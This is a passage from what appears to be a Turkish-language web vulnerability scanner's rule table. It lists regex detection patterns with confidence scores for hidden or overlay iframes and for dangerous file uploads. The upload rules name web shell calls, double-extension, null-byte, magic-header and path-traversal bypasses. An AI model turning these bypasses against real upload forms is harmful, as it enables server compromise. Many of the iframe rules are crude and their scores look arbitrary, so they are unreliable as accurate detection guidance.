    {"desen": r"vertical-align:\s*top[^}]*iframe[^}]*visibility:\s*hidden", "guven": 0.82, "aciklama": "Vertical align gizleme"},
    
    # SVG ve Canvas overlay
    {"desen": r"<svg[^>]*><foreignObject[^>]*><iframe", "guven": 0.91, "aciklama": "SVG foreignObject iframe"},
    {"desen": r"<canvas[^>]*></canvas>[^<]*<iframe", "guven": 0.88, "aciklama": "Canvas iframe overlay"},
    {"desen": r"getContext\(['\"]2d['\"].*iframe", "guven": 0.86, "aciklama": "Canvas 2D context iframe"},
    {"desen": r"drawImage\([^)]*iframe", "guven": 0.85, "aciklama": "Canvas drawImage iframe"},
    {"desen": r"<embed[^>]*><iframe", "guven": 0.84, "aciklama": "Embed iframe overlay"},
    
    # Table layout manipülasyonu
    {"desen": r"<table[^>]*><tr[^>]*><td[^>]*><iframe", "guven": 0.82, "aciklama": "Table cell iframe"},
    {"desen": r"display:\s*table-cell[^}]*iframe", "guven": 0.81, "aciklama": "Table cell display iframe"},
    {"desen": r"table-layout:\s*fixed[^}]*iframe", "guven": 0.80, "aciklama": "Fixed table layout iframe"},
    {"desen": r"border-collapse:\s*collapse[^}]*iframe", "guven": 0.79, "aciklama": "Collapsed border iframe"},
    {"desen": r"caption-side:\s*bottom[^}]*iframe", "guven": 0.78, "aciklama": "Caption side iframe"},
    
    # Iframe loading lazy/eager
    {"desen": r"<iframe[^>]*loading=['\"]lazy['\"]", "guven": 0.75, "aciklama": "Lazy loading iframe"},
    {"desen": r"<iframe[^>]*loading=['\"]eager['\"]", "guven": 0.74, "aciklama": "Eager loading iframe"},
    {"desen": r"<iframe[^>]*importance=['\"]low['\"]", "guven": 0.73, "aciklama": "Low importance iframe"},
    {"desen": r"<iframe[^>]*fetchpriority=['\"]low['\"]", "guven": 0.72, "aciklama": "Low fetch priority iframe"},
    {"desen": r"<iframe[^>]*decoding=['\"]async['\"]", "guven": 0.71, "aciklama": "Async decoding iframe"},
    
    # Referrer policy
    {"desen": r"<iframe[^>]*referrerpolicy=['\"]no-referrer['\"]", "guven": 0.78, "aciklama": "No referrer policy"},
    {"desen": r"<iframe[^>]*referrerpolicy=['\"]origin['\"]", "guven": 0.76, "aciklama": "Origin referrer policy"},
    {"desen": r"<iframe[^>]*referrerpolicy=['\"]unsafe-url['\"]", "guven": 0.79, "aciklama": "Unsafe URL referrer policy"},
    {"desen": r"<iframe[^>]*referrerpolicy=['\"]no-referrer-when-downgrade['\"]", "guven": 0.75, "aciklama": "No referrer downgrade"},
    {"desen": r"<iframe[^>]*referrerpolicy=['\"]same-origin['\"]", "guven": 0.74, "aciklama": "Same origin referrer"},
    
    # Feature Policy / Permissions Policy
    {"desen": r"<iframe[^>]*allow=['\"]camera[^'\"]*['\"]", "guven": 0.83, "aciklama": "Camera permission iframe"},
    {"desen": r"<iframe[^>]*allow=['\"]microphone[^'\"]*['\"]", "guven": 0.82, "aciklama": "Microphone permission iframe"},
    {"desen": r"<iframe[^>]*allow=['\"]geolocation[^'\"]*['\"]", "guven": 0.81, "aciklama": "Geolocation permission iframe"},
    {"desen": r"<iframe[^>]*allow=['\"]payment[^'\"]*['\"]", "guven": 0.85, "aciklama": "Payment permission iframe"},
    {"desen": r"<iframe[^>]*allow=['\"]fullscreen[^'\"]*['\"]", "guven": 0.80, "aciklama": "Fullscreen permission iframe"},
    
    # Content loading patterns
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.pdf['\"]", "guven": 0.77, "aciklama": "PDF iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.docx?['\"]", "guven": 0.76, "aciklama": "Document iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.(mp4|avi|mov)['\"]", "guven": 0.78, "aciklama": "Video iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.(jpg|jpeg|png|gif)['\"]", "guven": 0.75, "aciklama": "Image iframe"},
    {"desen": r"<iframe[^>]*src=['\"][^'\"]*\.json['\"]", "guven": 0.79, "aciklama": "JSON iframe"},
    
    # Accessibility bypass
    {"desen": r"<iframe[^>]*aria-hidden=['\"]true['\"]", "guven": 0.88, "aciklama": "ARIA hidden iframe"},
    {"desen": r"<iframe[^>]*role=['\"]presentation['\"]", "guven": 0.86, "aciklama": "Presentation role iframe"},
    {"desen": r"<iframe[^>]*tabindex=['\"]?-1['\"]?", "guven": 0.85, "aciklama": "Negative tabindex iframe"},
    {"desen": r"<iframe[^>]*aria-label=['\"]['\"]", "guven": 0.84, "aciklama": "Empty ARIA label"},
    {"desen": r"<iframe[^>]*title=['\"]['\"]", "guven": 0.83, "aciklama": "Empty title attribute"},
    
    # jQuery manipulation
    {"desen": r"\$\(['\"]iframe['\"].*\.hide\(\)", "guven": 0.87, "aciklama": "jQuery hide iframe"},
    {"desen": r"\$\(['\"]iframe['\"].*\.fadeOut\(\)", "guven": 0.86, "aciklama": "jQuery fadeOut iframe"},
    {"desen": r"\$\(['\"]iframe['\"].*\.css\(['\"]opacity['\"],\s*0\)", "guven": 0.88, "aciklama": "jQuery CSS opacity"},
    {"desen": r"\$\(['\"]iframe['\"].*\.css\(['\"]display['\"],\s*['\"]none['\"]", "guven": 0.87, "aciklama": "jQuery CSS display none"},
    {"desen": r"\$\(['\"]iframe['\"].*\.slideUp\(\)", "guven": 0.85, "aciklama": "jQuery slideUp iframe"},
    
    # Angular/React/Vue patterns
    {"desen": r"<iframe[^>]*\*ngIf=['\"]false['\"]", "guven": 0.86, "aciklama": "Angular ngIf false"},
    {"desen": r"<iframe[^>]*v-show=['\"]false['\"]", "guven": 0.85, "aciklama": "Vue v-show false"},
    {"desen": r"<iframe[^>]*v-if=['\"]false['\"]", "guven": 0.84, "aciklama": "Vue v-if false"},
    {"desen": r"<iframe[^>]*\{.*display:\s*['\"]none['\"].*\}", "guven": 0.83, "aciklama": "React inline style none"},
    {"desen": r"<iframe[^>]*className=['\"][^'\"]*hidden[^'\"]*['\"]", "guven": 0.82, "aciklama": "React hidden className"},
    
    # CSS-in-JS patterns
    {"desen": r"styled\.iframe`[^`]*opacity:\s*0", "guven": 0.85, "aciklama": "Styled-components opacity"},
    {"desen": r"css`[^`]*iframe[^`]*display:\s*none", "guven": 0.84, "aciklama": "CSS-in-JS display none"},
    {"desen": r"makeStyles\([^)]*iframe[^)]*visibility:\s*hidden", "guven": 0.83, "aciklama": "Material-UI makeStyles"},
    {"desen": r"emotion[^}]*iframe[^}]*opacity:\s*0", "guven": 0.82, "aciklama": "Emotion CSS opacity"},
    {"desen": r"jss[^}]*iframe[^}]*display:\s*none", "guven": 0.81, "aciklama": "JSS display none"},
    
    # Template engine patterns
    {"desen": r"\{\{#if\s+hideIframe\}\}<iframe", "guven": 0.84, "aciklama": "Handlebars conditional iframe"},
    {"desen": r"<%\s*if.*%><iframe", "guven": 0.83, "aciklama": "EJS conditional iframe"},
    {"desen": r"\{\%\s*if.*\%\}<iframe", "guven": 0.82, "aciklama": "Jinja2 conditional iframe"},
    {"desen": r"<?php\s+if.*?><iframe", "guven": 0.81, "aciklama": "PHP conditional iframe"},
    {"desen": r"@if\([^)]*\)<iframe", "guven": 0.80, "aciklama": "Blade conditional iframe"},
    
    # HTTP header bypass attempts
    {"desen": r"X-Frame-Options:\s*ALLOWALL", "guven": 0.89, "aciklama": "Invalid X-Frame-Options value"},
    {"desen": r"X-Frame-Options:\s*ALLOW-FROM\s+\*", "guven": 0.88, "aciklama": "Wildcard allow-from"},
    {"desen": r"X-Frame-Options:\s*", "guven": 0.75, "aciklama": "Empty X-Frame-Options"},
    {"desen": r"frame-ancestors\s+\*", "guven": 0.87, "aciklama": "Wildcard frame-ancestors"},
    {"desen": r"Content-Security-Policy:\s*$", "guven": 0.74, "aciklama": "Empty CSP header"},
    
    # Browser-specific hacks
    {"desen": r"-webkit-appearance:\s*none[^}]*iframe", "guven": 0.80, "aciklama": "Webkit appearance hack"},
    {"desen": r"-moz-appearance:\s*none[^}]*iframe", "guven": 0.79, "aciklama": "Mozilla appearance hack"},
    {"desen": r"filter:\s*progid:DXImageTransform[^}]*iframe", "guven": 0.88, "aciklama": "IE DX filter"},
    {"desen": r"-ms-filter[^}]*iframe", "guven": 0.86, "aciklama": "IE ms-filter"},
    {"desen": r"zoom:\s*0[^}]*iframe", "guven": 0.85, "aciklama": "IE zoom hack"},
    
    # Conditional comments (IE)
    {"desen": r"<!--\[if\s+IE[^\]]*\]>[^<]*<iframe", "guven": 0.87, "aciklama": "IE conditional comment iframe"},
    {"desen": r"<!--\[if\s+!IE[^\]]*\]><!-->[^<]*<iframe", "guven": 0.86, "aciklama": "Non-IE conditional iframe"},
    {"desen": r"<!--\[if\s+lt\s+IE[^\]]*\]>[^<]*<iframe", "guven": 0.85, "aciklama": "IE version specific iframe"},
    {"desen": r"<!--\[if\s+gte\s+IE[^\]]*\]>[^<]*<iframe", "guven": 0.84, "aciklama": "IE greater than version"},
    {"desen": r"<!--\[if\s+IE\s+\d+\]>[^<]*<iframe", "guven": 0.83, "aciklama": "Specific IE version iframe"},
    
    # Mobile viewport manipulation
    {"desen": r"<meta[^>]*viewport[^>]*user-scalable=no[^>]*>[^<]*<iframe", "guven": 0.82, "aciklama": "No user scaling with iframe"},
    {"desen": r"<meta[^>]*viewport[^>]*initial-scale=0[^>]*>[^<]*<iframe", "guven": 0.84, "aciklama": "Zero initial scale iframe"},
    {"desen": r"<meta[^>]*viewport[^>]*maximum-scale=1[^>]*>[^<]*<iframe", "guven": 0.81, "aciklama": "Fixed scale iframe"},
    {"desen": r"@media\s+\(max-width:\s*1px\)[^}]*iframe", "guven": 0.88, "aciklama": "Impossible media query"},
    {"desen": r"@media\s+\(orientation:\s*portrait\)[^}]*iframe[^}]*display:\s*none", "guven": 0.85, "aciklama": "Portrait hide iframe"},
    
    # Touch and gesture blocking
    {"desen": r"touch-action:\s*none[^}]*iframe", "guven": 0.86, "aciklama": "Touch action none iframe"},
    {"desen": r"-ms-touch-action:\s*none[^}]*iframe", "guven": 0.85, "aciklama": "MS touch action none"},
    {"desen": r"pointer-events:\s*all[^}]*iframe[^}]*position:\s*absolute", "guven": 0.89, "aciklama": "Pointer events overlay"},
    {"desen": r"user-drag:\s*none[^}]*iframe", "guven": 0.83, "aciklama": "User drag none iframe"},
    {"desen": r"-webkit-user-drag:\s*none[^}]*iframe", "guven": 0.82, "aciklama": "Webkit user drag none"},
    
    # Advanced CSS selectors
    {"desen": r"iframe:not\(\[src\]\)", "guven": 0.84, "aciklama": "Iframe without src"},
    {"desen": r"iframe:empty", "guven": 0.83, "aciklama": "Empty iframe selector"},
    {"desen": r"iframe:only-child", "guven": 0.82, "aciklama": "Only child iframe"},
    {"desen": r"iframe:first-of-type", "guven": 0.81, "aciklama": "First iframe type"},
    {"desen": r"iframe:last-of-type", "guven": 0.80, "aciklama": "Last iframe type"},
    
    # CSS counters and content
    {"desen": r"content:\s*['\"]['\"][^}]*iframe", "guven": 0.85, "aciklama": "Empty content iframe"},
    {"desen": r"counter-reset[^}]*iframe", "guven": 0.79, "aciklama": "Counter reset iframe"},
    {"desen": r"content:\s*attr\([^)]*\)[^}]*iframe", "guven": 0.83, "aciklama": "Content attr iframe"},
    {"desen": r"quotes:\s*none[^}]*iframe", "guven": 0.78, "aciklama": "Quotes none iframe"},
    {"desen": r"list-style:\s*none[^}]*iframe", "guven": 0.77, "aciklama": "List style none iframe"},
    
    # Flexbox/Grid advanced
    {"desen": r"order:\s*-?\d+[^}]*iframe", "guven": 0.82, "aciklama": "Flex order iframe"},
    {"desen": r"flex-shrink:\s*0[^}]*iframe", "guven": 0.81, "aciklama": "Flex shrink iframe"},
    {"desen": r"flex-grow:\s*0[^}]*iframe", "guven": 0.80, "aciklama": "Flex grow iframe"},
    {"desen": r"grid-column:\s*1\s*/\s*-1[^}]*iframe", "guven": 0.84, "aciklama": "Grid full width iframe"},
    {"desen": r"grid-row:\s*1\s*/\s*-1[^}]*iframe", "guven": 0.83, "aciklama": "Grid full height iframe"},
    
    # Shadow DOM patterns
    {"desen": r"attachShadow\([^)]*\)[^}]*iframe", "guven": 0.89, "aciklama": "Shadow DOM iframe"},
    {"desen": r"shadowRoot[^}]*iframe", "guven": 0.88, "aciklama": "Shadow root iframe"},
    {"desen": r"<template[^>]*>[^<]*<iframe", "guven": 0.85, "aciklama": "Template tag iframe"},
    {"desen": r"<slot[^>]*>[^<]*<iframe", "guven": 0.84, "aciklama": "Slot tag iframe"},
    {"desen": r"::slotted\(iframe\)", "guven": 0.83, "aciklama": "Slotted iframe selector"},
    
    # Web Components
    {"desen": r"customElements\.define[^}]*iframe", "guven": 0.86, "aciklama": "Custom element iframe"},
    {"desen": r"class.*extends\s+HTMLElement[^}]*iframe", "guven": 0.85, "aciklama": "HTMLElement extension iframe"},
    {"desen": r"connectedCallback[^}]*iframe", "guven": 0.84, "aciklama": "Connected callback iframe"},
    {"desen": r"disconnectedCallback[^}]*iframe", "guven": 0.83, "aciklama": "Disconnected callback iframe"},
    {"desen": r"attributeChangedCallback[^}]*iframe", "guven": 0.82, "aciklama": "Attribute changed iframe"},
    
    # Service Worker patterns
    {"desen": r"navigator\.serviceWorker[^}]*iframe", "guven": 0.87, "aciklama": "Service worker iframe"},
    {"desen": r"self\.addEventListener[^}]*iframe", "guven": 0.86, "aciklama": "Service worker event iframe"},
    {"desen": r"registration\.update[^}]*iframe", "guven": 0.85, "aciklama": "SW registration iframe"},
    {"desen": r"caches\.open[^}]*iframe", "guven": 0.84, "aciklama": "Cache API iframe"},
    {"desen": r"fetch\([^)]*\)[^}]*iframe", "guven": 0.83, "aciklama": "Fetch API iframe"},
    
    # Web Workers
    {"desen": r"new\s+Worker\([^)]*\)[^}]*iframe", "guven": 0.86, "aciklama": "Web worker iframe"},
    {"desen": r"postMessage\([^)]*\)[^}]*iframe", "guven": 0.85, "aciklama": "Post message iframe"},
    {"desen": r"onmessage\s*=[^}]*iframe", "guven": 0.84, "aciklama": "Message handler iframe"},
    {"desen": r"importScripts\([^)]*\)[^}]*iframe", "guven": 0.83, "aciklama": "Import scripts iframe"},
    {"desen": r"terminate\(\)[^}]*iframe", "guven": 0.82, "aciklama": "Worker terminate iframe"},
    
    # Storage API manipulation
    {"desen": r"localStorage\.setItem[^}]*iframe", "guven": 0.84, "aciklama": "LocalStorage iframe"},
    {"desen": r"sessionStorage\.setItem[^}]*iframe", "guven": 0.83, "aciklama": "SessionStorage iframe"},
    {"desen": r"indexedDB\.open[^}]*iframe", "guven": 0.85, "aciklama": "IndexedDB iframe"},
    {"desen": r"navigator\.storage[^}]*iframe", "guven": 0.82, "aciklama": "Storage API iframe"},
    {"desen": r"caches\.match[^}]*iframe", "guven": 0.81, "aciklama": "Cache match iframe"},
    
    # Geolocation API
    {"desen": r"navigator\.geolocation[^}]*iframe", "guven": 0.86, "aciklama": "Geolocation iframe"},
    {"desen": r"getCurrentPosition[^}]*iframe", "guven": 0.85, "aciklama": "Get position iframe"},
    {"desen": r"watchPosition[^}]*iframe", "guven": 0.84, "aciklama": "Watch position iframe"},
    {"desen": r"clearWatch[^}]*iframe", "guven": 0.83, "aciklama": "Clear watch iframe"},
    {"desen": r"PositionError[^}]*iframe", "guven": 0.82, "aciklama": "Position error iframe"},
    
    # Device APIs
    {"desen": r"navigator\.mediaDevices[^}]*iframe", "guven": 0.87, "aciklama": "Media devices iframe"},
    {"desen": r"getUserMedia[^}]*iframe", "guven": 0.88, "aciklama": "Get user media iframe"},
    {"desen": r"navigator\.camera[^}]*iframe", "guven": 0.86, "aciklama": "Camera API iframe"},
    {"desen": r"navigator\.microphone[^}]*iframe", "guven": 0.85, "aciklama": "Microphone API iframe"},
    {"desen": r"DeviceOrientationEvent[^}]*iframe", "guven": 0.84, "aciklama": "Device orientation iframe"},
    
    # Payment API
    {"desen": r"new\s+PaymentRequest[^}]*iframe", "guven": 0.90, "aciklama": "Payment request iframe"},
    {"desen": r"PaymentResponse[^}]*iframe", "guven": 0.89, "aciklama": "Payment response iframe"},
    {"desen": r"canMakePayment[^}]*iframe", "guven": 0.88, "aciklama": "Can make payment iframe"},
    {"desen": r"show\(\)[^}]*iframe", "guven": 0.82, "aciklama": "Payment show iframe"},
    {"desen": r"abort\(\)[^}]*iframe", "guven": 0.81, "aciklama": "Payment abort iframe"},
    
    # WebRTC patterns
    {"desen": r"RTCPeerConnection[^}]*iframe", "guven": 0.87, "aciklama": "WebRTC peer iframe"},
    {"desen": r"createOffer[^}]*iframe", "guven": 0.86, "aciklama": "WebRTC offer iframe"},
    {"desen": r"createAnswer[^}]*iframe", "guven": 0.85, "aciklama": "WebRTC answer iframe"},
    {"desen": r"addIceCandidate[^}]*iframe", "guven": 0.84, "aciklama": "ICE candidate iframe"},
    {"desen": r"getStats[^}]*iframe", "guven": 0.83, "aciklama": "WebRTC stats iframe"},
    
    # Notification API
    {"desen": r"new\s+Notification[^}]*iframe", "guven": 0.85, "aciklama": "Notification iframe"},
    {"desen": r"Notification\.requestPermission[^}]*iframe", "guven": 0.86, "aciklama": "Notification permission iframe"},
    {"desen": r"navigator\.serviceWorker\.ready[^}]*iframe", "guven": 0.84, "aciklama": "SW ready iframe"},
    {"desen": r"registration\.showNotification[^}]*iframe", "guven": 0.87, "aciklama": "Show notification iframe"},
    {"desen": r"notificationclick[^}]*iframe", "guven": 0.83, "aciklama": "Notification click iframe"},
    
    # Fullscreen API
    {"desen": r"requestFullscreen[^}]*iframe", "guven": 0.86, "aciklama": "Request fullscreen iframe"},
    {"desen": r"exitFullscreen[^}]*iframe", "guven": 0.85, "aciklama": "Exit fullscreen iframe"},
    {"desen": r"fullscreenElement[^}]*iframe", "guven": 0.84, "aciklama": "Fullscreen element iframe"},
    {"desen": r"fullscreenchange[^}]*iframe", "guven": 0.83, "aciklama": "Fullscreen change iframe"},
    {"desen": r"fullscreenerror[^}]*iframe", "guven": 0.82, "aciklama": "Fullscreen error iframe"},
    
    # Screen Capture API
    {"desen": r"getDisplayMedia[^}]*iframe", "guven": 0.89, "aciklama": "Screen capture iframe"},
    {"desen": r"navigator\.mediaDevices\.getDisplayMedia[^}]*iframe", "guven": 0.90, "aciklama": "Display media iframe"},
    {"desen": r"captureStream[^}]*iframe", "guven": 0.88, "aciklama": "Capture stream iframe"},
    {"desen": r"MediaRecorder[^}]*iframe", "guven": 0.87, "aciklama": "Media recorder iframe"},
    {"desen": r"start\(\)[^}]*iframe", "guven": 0.80, "aciklama": "Recorder start iframe"},
    
    # Clipboard API
    {"desen": r"navigator\.clipboard[^}]*iframe", "guven": 0.88, "aciklama": "Clipboard API iframe"},
    {"desen": r"writeText[^}]*iframe", "guven": 0.87, "aciklama": "Clipboard write iframe"},
    {"desen": r"readText[^}]*iframe", "guven": 0.89, "aciklama": "Clipboard read iframe"},
    {"desen": r"execCommand\(['\"]copy['\"].*iframe", "guven": 0.86, "aciklama": "ExecCommand copy iframe"},
    {"desen": r"execCommand\(['\"]paste['\"].*iframe", "guven": 0.85, "aciklama": "ExecCommand paste iframe"},
    
    # Credential Management API
    {"desen": r"navigator\.credentials[^}]*iframe", "guven": 0.91, "aciklama": "Credentials API iframe"},
    {"desen": r"create\(\)[^}]*iframe", "guven": 0.85, "aciklama": "Credential create iframe"},
    {"desen": r"get\(\)[^}]*iframe", "guven": 0.84, "aciklama": "Credential get iframe"},
    {"desen": r"store\(\)[^}]*iframe", "guven": 0.86, "aciklama": "Credential store iframe"},
    {"desen": r"preventSilentAccess[^}]*iframe", "guven": 0.87, "aciklama": "Prevent silent access iframe"},
    
    # Web Authentication API
    {"desen": r"navigator\.credentials\.create\([^)]*publicKey[^}]*iframe", "guven": 0.92, "aciklama": "WebAuthn create iframe"},
    {"desen": r"navigator\.credentials\.get\([^)]*publicKey[^}]*iframe", "guven": 0.91, "aciklama": "WebAuthn get iframe"},
    {"desen": r"PublicKeyCredential[^}]*iframe", "guven": 0.90, "aciklama": "Public key credential iframe"},
    {"desen": r"AuthenticatorResponse[^}]*iframe", "guven": 0.89, "aciklama": "Authenticator response iframe"},
    {"desen": r"attestationObject[^}]*iframe", "guven": 0.88, "aciklama": "Attestation object iframe"},
    
    # Background Sync
    {"desen": r"serviceWorker\.sync[^}]*iframe", "guven": 0.86, "aciklama": "Background sync iframe"},
    {"desen": r"registration\.sync\.register[^}]*iframe", "guven": 0.87, "aciklama": "Sync register iframe"},
    {"desen": r"sync[^}]*iframe", "guven": 0.75, "aciklama": "Sync event iframe"},
    {"desen": r"waitUntil[^}]*iframe", "guven": 0.83, "aciklama": "Wait until iframe"},
    {"desen": r"lastChance[^}]*iframe", "guven": 0.82, "aciklama": "Last chance sync iframe"},
    
    # Performance API
    {"desen": r"performance\.mark[^}]*iframe", "guven": 0.81, "aciklama": "Performance mark iframe"},
    {"desen": r"performance\.measure[^}]*iframe", "guven": 0.80, "aciklama": "Performance measure iframe"},
    {"desen": r"performance\.navigation[^}]*iframe", "guven": 0.79, "aciklama": "Performance navigation iframe"},
    {"desen": r"performance\.timing[^}]*iframe", "guven": 0.78, "aciklama": "Performance timing iframe"},
    {"desen": r"x-frame-options", "guven": 0.7, "aciklama": "X-Frame-Options eksikliği"}
],

ZafiyetTipi.FILE_UPLOAD: [
    {"desen": r"Content-Disposition: form-data; name=.*?filename=", "guven": 0.9, "aciklama": "Dosya yükleme parametresi"},
    # Temel Dosya Yükleme Desenleri
    {"desen": r"Content-Disposition: form-data; name=.*?filename=", "guven": 0.9, "aciklama": "Dosya yükleme parametresi"},
    {"desen": r"\.php|\.exe|\.jsp", "guven": 0.85, "aciklama": "Tehlikeli uzantı içeren dosya"},
    {"desen": r"multipart/form-data", "guven": 0.8, "aciklama": "Multipart form data"},
    {"desen": r"enctype=['\"]multipart/form-data['\"]", "guven": 0.85, "aciklama": "Form enctype multipart"},
    {"desen": r"<input[^>]*type=['\"]file['\"]", "guven": 0.9, "aciklama": "HTML file input"},
    
    # Tehlikeli Dosya Uzantıları
    {"desen": r"\.asp[x]?", "guven": 0.9, "aciklama": "ASP/ASPX dosyası"},
    {"desen": r"\.cfm", "guven": 0.85, "aciklama": "ColdFusion dosyası"},
    {"desen": r"\.cgi", "guven": 0.8, "aciklama": "CGI script dosyası"},
    {"desen": r"\.pl", "guven": 0.75, "aciklama": "Perl script dosyası"},
    {"desen": r"\.py", "guven": 0.7, "aciklama": "Python script dosyası"},
    {"desen": r"\.rb", "guven": 0.7, "aciklama": "Ruby script dosyası"},
    {"desen": r"\.sh", "guven": 0.85, "aciklama": "Shell script dosyası"},
    {"desen": r"\.bat", "guven": 0.9, "aciklama": "Batch dosyası"},
    {"desen": r"\.cmd", "guven": 0.9, "aciklama": "Command dosyası"},
    {"desen": r"\.com", "guven": 0.95, "aciklama": "COM executable"},
    {"desen": r"\.scr", "guven": 0.9, "aciklama": "Screen saver executable"},
    {"desen": r"\.pif", "guven": 0.85, "aciklama": "Program Information File"},
    {"desen": r"\.vbs", "guven": 0.9, "aciklama": "VBScript dosyası"},
    {"desen": r"\.js", "guven": 0.6, "aciklama": "JavaScript dosyası"},
    {"desen": r"\.jar", "guven": 0.8, "aciklama": "Java Archive"},
    
    # Çift Uzantı Bypass Teknikleri
    {"desen": r"\.php\.txt", "guven": 0.85, "aciklama": "Çift uzantı bypass"},
    {"desen": r"\.php\.jpg", "guven": 0.9, "aciklama": "PHP JPEG bypass"},
    {"desen": r"\.php\.png", "guven": 0.9, "aciklama": "PHP PNG bypass"},
    {"desen": r"\.php\.gif", "guven": 0.9, "aciklama": "PHP GIF bypass"},
    {"desen": r"\.asp\.jpg", "guven": 0.85, "aciklama": "ASP JPEG bypass"},
    {"desen": r"\.jsp\.png", "guven": 0.85, "aciklama": "JSP PNG bypass"},
    {"desen": r"\.php\.", "guven": 0.8, "aciklama": "PHP nokta bypass"},
    {"desen": r"\.php%00", "guven": 0.95, "aciklama": "Null byte injection"},
    {"desen": r"\.php\x00", "guven": 0.95, "aciklama": "Hex null byte injection"},
    {"desen": r"\.php;\.jpg", "guven": 0.9, "aciklama": "Semicolon bypass"},
    
    # Büyük/Küçük Harf Bypass
    {"desen": r"\.PHP", "guven": 0.8, "aciklama": "PHP büyük harf"},
    {"desen": r"\.Php", "guven": 0.8, "aciklama": "PHP mixed case"},
    {"desen": r"\.pHp", "guven": 0.8, "aciklama": "PHP mixed case 2"},
    {"desen": r"\.ASP", "guven": 0.8, "aciklama": "ASP büyük harf"},
    {"desen": r"\.JSP", "guven": 0.8, "aciklama": "JSP büyük harf"},
    {"desen": r"\.EXE", "guven": 0.9, "aciklama": "EXE büyük harf"},
    
    # Alternatif Uzantılar
    {"desen": r"\.php3", "guven": 0.9, "aciklama": "PHP3 uzantısı"},
    {"desen": r"\.php4", "guven": 0.9, "aciklama": "PHP4 uzantısı"},
    {"desen": r"\.php5", "guven": 0.9, "aciklama": "PHP5 uzantısı"},
    {"desen": r"\.php7", "guven": 0.9, "aciklama": "PHP7 uzantısı"},
    {"desen": r"\.phtml", "guven": 0.9, "aciklama": "PHTML uzantısı"},
    {"desen": r"\.phps", "guven": 0.8, "aciklama": "PHP source uzantısı"},
    {"desen": r"\.pht", "guven": 0.85, "aciklama": "PHT uzantısı"},
    {"desen": r"\.phar", "guven": 0.9, "aciklama": "PHP Archive"},
    {"desen": r"\.inc", "guven": 0.7, "aciklama": "Include dosyası"},
    {"desen": r"\.asa", "guven": 0.85, "aciklama": "ASA dosyası"},
    {"desen": r"\.cer", "guven": 0.6, "aciklama": "Certificate dosyası"},
    {"desen": r"\.cdx", "guven": 0.7, "aciklama": "CDX dosyası"},
    
    # Web Shell Desenleri  
    {"desen": r"<\?php.*system\(", "guven": 0.95, "aciklama": "PHP system() web shell"},
    {"desen": r"<\?php.*exec\(", "guven": 0.95, "aciklama": "PHP exec() web shell"},
    {"desen": r"<\?php.*shell_exec\(", "guven": 0.95, "aciklama": "PHP shell_exec() web shell"},
    {"desen": r"<\?php.*passthru\(", "guven": 0.95, "aciklama": "PHP passthru() web shell"},
    {"desen": r"<%.*eval\(", "guven": 0.9, "aciklama": "ASP eval() web shell"},
    {"desen": r"Runtime\.getRuntime\(\)\.exec", "guven": 0.95, "aciklama": "Java runtime exec"},
    {"desen": r"<script.*eval\(", "guven": 0.8, "aciklama": "JavaScript eval"},
    {"desen": r"\$_GET\[.*\]", "guven": 0.8, "aciklama": "PHP GET parameter"},
    {"desen": r"\$_POST\[.*\]", "guven": 0.8, "aciklama": "PHP POST parameter"},
    {"desen": r"\$_REQUEST\[.*\]", "guven": 0.8, "aciklama": "PHP REQUEST parameter"},
    
    # Dosya İçerik Desenleri
    {"desen": r"GIF89a.*<\?php", "guven": 0.95, "aciklama": "GIF header ile PHP bypass"},
    {"desen": r"PNG.*<\?php", "guven": 0.95, "aciklama": "PNG header ile PHP bypass"},
    {"desen": r"JFIF.*<\?php", "guven": 0.95, "aciklama": "JPEG header ile PHP bypass"},
    {"desen": r"\xff\xd8\xff.*<\?php", "guven": 0.95, "aciklama": "JPEG binary header PHP bypass"},
    {"desen": r"BM.*<\?php", "guven": 0.95, "aciklama": "BMP header ile PHP bypass"},
    {"desen": r"PK.*<\?php", "guven": 0.9, "aciklama": "ZIP header ile PHP bypass"},
    {"desen": r"PDF.*<\?php", "guven": 0.9, "aciklama": "PDF header ile PHP bypass"},
    
    # Dosya Yükleme Parametreleri
    {"desen": r"name=['\"]upload['\"]", "guven": 0.8, "aciklama": "Upload form alanı"},
    {"desen": r"name=['\"]file['\"]", "guven": 0.8, "aciklama": "File form alanı"},
    {"desen": r"name=['\"]attachment['\"]", "guven": 0.7, "aciklama": "Attachment form alanı"},
    {"desen": r"name=['\"]document['\"]", "guven": 0.7, "aciklama": "Document form alanı"},
    {"desen": r"name=['\"]image['\"]", "guven": 0.6, "aciklama": "Image form alanı"},
    {"desen": r"name=['\"]avatar['\"]", "guven": 0.6, "aciklama": "Avatar form alanı"},
    {"desen": r"name=['\"]photo['\"]", "guven": 0.6, "aciklama": "Photo form alanı"},
    {"desen": r"name=['\"]resume['\"]", "guven": 0.7, "aciklama": "Resume form alanı"},
    {"desen": r"name=['\"]cv['\"]", "guven": 0.7, "aciklama": "CV form alanı"},
    
    # HTTP Header Manipülasyonu
    {"desen": r"Content-Type: image/.*", "guven": 0.6, "aciklama": "Image content type"},
    {"desen": r"Content-Type: text/plain", "guven": 0.7, "aciklama": "Text plain content type"},
    {"desen": r"Content-Type: application/octet-stream", "guven": 0.8, "aciklama": "Binary content type"},
    {"desen": r"Content-Length: 0", "guven": 0.5, "aciklama": "Zero content length"},
    {"desen": r"filename=['\"].*\.php['\"]", "guven": 0.9, "aciklama": "PHP filename"},
    {"desen": r"filename=['\"].*\.asp['\"]", "guven": 0.9, "aciklama": "ASP filename"},
    {"desen": r"filename=['\"].*\.jsp['\"]", "guven": 0.9, "aciklama": "JSP filename"},
    {"desen": r"filename=['\"].*\.exe['\"]", "guven": 0.95, "aciklama": "EXE filename"},
    
    # Path Traversal Kombinasyonları
    {"desen": r"filename=['\"]\.\.\/", "guven": 0.9, "aciklama": "Path traversal filename"},
    {"desen": r"filename=['\"].*\.\..*\.php", "guven": 0.95, "aciklama": "Path traversal PHP"},
    {"desen": r"filename=['\"].*%2e%2e%2f", "guven": 0.9, "aciklama": "URL encoded path traversal"},
    {"desen": r"filename=['\"].*\.\.\\\.*\.php", "guven": 0.95, "aciklama": "Windows path traversal PHP"},
    
    # Encoding Bypass Teknikleri
    {"desen": r"\.p%68p", "guven": 0.85, "aciklama": "URL encoded PHP"},
    {"desen": r"\.%70%68%70", "guven": 0.85, "aciklama": "Full URL encoded PHP"},
    {"desen": r"\.ph\u0070", "guven": 0.8, "aciklama": "Unicode encoded PHP"},
